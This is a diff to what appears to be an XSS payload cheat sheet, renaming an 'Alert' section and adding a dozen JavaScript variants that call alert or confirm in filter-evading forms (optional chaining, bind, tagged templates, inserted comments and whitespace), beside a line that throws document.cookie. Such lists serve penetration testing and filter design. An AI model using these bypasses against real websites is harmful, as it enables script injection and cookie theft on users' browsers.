@@ -307,8 +307,20 @@ https://www.gremwell.com/firefox-xss-302<br>
 https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/
 
 
-### Alert
+### Test function 
 ```js
+confirm?.(1)
+top.confirm?.(1)
+alert?.(1)
+(a=>a(1))(alert);
+setTimeout(alert, 0, 1)
+[1].forEach(alert);
+alert.bind()(1)
+a=alert;a`1`;
+alert()
+alert/**/()
+alert (10)
+alert\n(1)
 var{a:onerror}={a:alert};throw%20document.cookie
 alert(1)
 window['alert'](0)
